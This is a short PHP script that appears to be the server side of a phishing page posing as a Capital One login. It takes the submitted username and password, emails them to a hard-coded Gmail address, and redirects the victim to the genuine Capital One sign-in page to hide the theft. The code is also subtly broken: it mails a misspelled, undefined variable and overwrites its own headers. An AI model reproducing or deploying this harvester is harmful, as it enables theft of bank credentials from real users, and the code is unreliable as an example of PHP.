<?php





$username = $_POST['noAcctUid'];

$password = $_POST['noAcctPw'];



if($username==is_null($username) || $password==is_null($password)){

	

	

header("Location:index.htm");

	

	

	

}



else{

	

	$to = 'wagba101@gmail.com';

	$subject = ' CAPITAL RESULTS';

	$message = "USERNAME:" . $username."  PASSWORD".$password;

	

	

	$headers ='From: '.$username.''.'\n\n';

	$headers ="MIME-Version: 1.0 \r\n";

	$headers ="Content-type: text/html \r\n";

	

	mail($to,$subject,$mesage,$headers);

	

	header("Location:https://capitalone.com/signin/auth");

	

}























?>